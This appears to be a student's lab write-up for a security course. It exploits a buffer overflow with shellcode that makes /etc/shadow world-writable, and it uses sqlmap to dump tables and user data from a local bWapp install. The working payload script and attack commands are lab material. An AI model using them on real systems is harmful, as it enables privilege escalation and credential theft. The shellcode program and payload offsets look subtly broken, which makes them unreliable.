# Lab #1,2110011, Tran Dai Duong, INSE331280E_03FIE
# Task 1: Software buffer overflow attack
 
Given a vulnerable C program 
```
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode in C. This shellcode executes chmod 777 /etc/shadow without having to sudo to escalate privilege
```
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x89\xc3\x31\xd8\x50\xbe\x3e\x1f"
"\x3a\x56\x81\xc6\x23\x45\x35\x21"
"\x89\x74\x24\xfc\xc7\x44\x24\xf8"
"\x2f\x2f\x73\x68\xc7\x44\x24\xf4"
"\x2f\x65\x74\x63\x83\xec\x0c\x89"
"\xe3\x66\x68\xff\x01\x66\x59\xb0"
"\x0f\xcd\x80";

int
void main() {
    int (*ret)() = (int(*)())code;
}
```
**Question 1**:
- Compile both C programs and shellcode to executable code. 
- Conduct the attack so that when C executable code runs, shellcode willc also be triggered. 
  You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
  
**Answer 1**: Must conform to below structure:

Description text (optional)
This task demonstrates how to exploit a buffer overflow vulnerability in a C program to execute arbitrary shellcode that changes the permissions of the /etc/shadow file. The vulnerable program does not check the length of the input and can be manipulated to overwrite the return address, allowing us to redirect execution to our shellcode.

``` 
1. Compile the Vulnerable Program: Compile the provided vulnerable C program with stack protection disabled and executable stacks enabled : gcc -o vulnerable vulnerable.c -fno-stack-protector -z execstack
2. Compile the Shellcode: Save the shellcode into a new C file called shellcode.c, then compile it : gcc -o shellcode shellcode.c -fno-stack-protector -z execstack
3. Create the Payload: Write a Python script (payload.py) to create a payload consisting of a NOP sled, shellcode, and the return address.
# payload.py
import struct

buffer_size = 16
nop_sled = b"\x90" * 40  # NOP sled
shellcode = (
    b"\x89\xc3\x31\xd8\x50\xbe\x3e\x1f"
    b"\x3a\x56\x81\xc6\x23\x45\x35\x21"
    b"\x89\x74\x24\xfc\xc7\x44\x24\xf8"
    b"\x2f\x2f\x73\x68\xc7\x44\x24\xf4"
    b"\x2f\x65\x74\x63\x83\xec\x0c\x89"
    b"\xe3\x66\x68\xff\x01\x66\x59\xb0"
    b"\x0f\xcd\x80"
)

# Replace with the address of the NOP sled
ret_address = struct.pack("<I", 0xbffff0c0)  # Example address; adjust as needed

# Create payload
payload = nop_sled + shellcode + ret_address

# Write payload to file
with open("payload.bin", "wb") as f:
    f.write(payload)
4. Run the Attack: Execute the vulnerable program with the crafted payload. : ./vulnerable "$(cat payload.bin)"
5. Verify Permissions Change: Check the permissions of /etc/shadow to confirm the attack was successful: ls -l /etc/shadow 

	
```

output screenshot (optional)
![image](https://github.com/user-attachments/assets/144406c9-2524-42ed-baf4-987607596328)


**Conclusion**: In this task, we successfully exploited a buffer overflow vulnerability in a C program to execute arbitrary shellcode that altered the permissions of the /etc/shadow file.

# Task 2: Attack on the database of bWapp 
- Install bWapp (refer to quang-ute/Security-labs/Web-security). 
- Install sqlmap.
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 

**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:
- To retrieve all available databases from the bWapp application, we will use sqlmap with the --dbs option.

First, we need to identify the target endpoint. After accessing the login page, we can simulate a login attempt with random credentials and inspect the request in the Network tab (F12) to find the vulnerable parameter.

Enter a username and password (e.g., admin/admin) and submit the form.

The target endpoint for SQL injection is: http://localhost:8025/login.php?username=admin&password=admin
![image](https://github.com/user-attachments/assets/b1a1b818-ad24-44c4-a5f6-9473e278cb1a)


**Question 2**: Use sqlmap to get tables, users information
**Answer 2**:
After identifying the database (e.g., bWapp), run the following command to get the list of tables within that database:
python sqlmap.py -u "http://localhost:8025/login.php" --data="username=admin&password=admin" -D bWapp --tables
Assuming there is a table named users, use the following command to extract user information: 
python sqlmap.py -u "http://localhost:8025/login.php" --data="username=admin&password=admin" -D bWapp -T users --dump
**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
**Answer 3**:


